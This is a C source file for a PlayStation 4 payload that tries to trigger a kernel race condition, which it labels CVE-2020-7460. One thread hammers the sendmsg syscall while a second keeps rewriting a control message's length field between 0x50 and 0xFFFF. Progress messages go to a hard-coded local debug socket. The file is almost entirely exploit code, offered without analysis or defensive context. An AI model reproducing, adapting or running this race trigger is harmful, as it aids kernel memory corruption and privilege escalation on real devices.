#include "ps4.h"

#include <stdarg.h>

typedef struct {
    uint64_t bits[16];
} cpuset_t;

#define _CPU_SET(cpu, cpusetp) ((cpusetp)->bits[(cpu) / 64] |= (1ULL << ((cpu) % 64)))
#define _CPU_ZERO(cpusetp) memset((cpusetp), 0, sizeof(cpuset_t))

struct msghdr {
    void         *msg_name;
    uint32_t      msg_namelen;
    void         *msg_iov;
    int           msg_iovlen;
    void         *msg_control;
    uint32_t      msg_controllen;
    int           msg_flags;
};

struct cmsghdr {
    uint32_t      cmsg_len;
    int           cmsg_level;
    int           cmsg_type;
};

#define ITERATIONS 2000000
#define CONTROL_LEN 512
#define DEBUG_IP "192.168.176.162"
#define DEBUG_PORT 9023

struct cmsghdr *cmsg;
uint8_t control_buf[CONTROL_LEN];
int global_sock;
int debug_sock;

void print_debug(const char *fmt, ...) {
    if (debug_sock <= 0) return;
    char buffer[512];
    va_list args;
    va_start(args, fmt);
    vsnprintf(buffer, sizeof(buffer), fmt, args);
    va_end(args);
    SckSend(debug_sock, buffer, strlen(buffer));
}

void *sendmsg_thread(void *arg) {
    UNUSED(arg);
    cpuset_t cpuset;
    _CPU_ZERO(&cpuset);
    _CPU_SET(0, &cpuset);
    syscall(597, scePthreadSelf(), sizeof(cpuset), &cpuset);

    struct msghdr msg;
    memset(&msg, 0, sizeof(msg));
    msg.msg_control = control_buf;
    msg.msg_controllen = CONTROL_LEN;

    for (int i = 0; i < ITERATIONS; i++) {
        syscall(28, global_sock, &msg, 0);
    }
    return NULL;
}

void *race_thread(void *arg) {
    UNUSED(arg);
    cpuset_t cpuset;
    _CPU_ZERO(&cpuset);
    _CPU_SET(1, &cpuset);
    syscall(597, scePthreadSelf(), sizeof(cpuset), &cpuset);

    for (int i = 0; i < ITERATIONS; i++) {
        cmsg->cmsg_len = 0x50;
        for(volatile int dump=0; dump<10; dump++);
        cmsg->cmsg_len = 0xFFFF;
    }
    return NULL;
}

int _main(struct thread *td) {
    UNUSED(td);
    initKernel();
    initLibc();
    initNetwork();
    initPthread();

    debug_sock = SckConnect(DEBUG_IP, DEBUG_PORT);
    
    print_debug("[+] CVE-2020-7460 Race Started\n");

    global_sock = syscall(97, 2, 2, 0);
    if (global_sock < 0) {
        print_debug("[-] Socket Error\n");
        return -1;
    }

    memset(control_buf, 0, CONTROL_LEN);
    cmsg = (struct cmsghdr *)control_buf;
    cmsg->cmsg_level = 0;
    cmsg->cmsg_type = 7; 
    cmsg->cmsg_len = 0x50;

    ScePthread thread1, thread2;
    scePthreadCreate(&thread1, NULL, sendmsg_thread, NULL, "thr1");
    scePthreadCreate(&thread2, NULL, race_thread, NULL, "thr2");

    scePthreadJoin(thread1, NULL);
    scePthreadJoin(thread2, NULL);

    print_debug("[+] Race Finished\n");

    if (debug_sock > 0) SckClose(debug_sock);
    return 0;
}
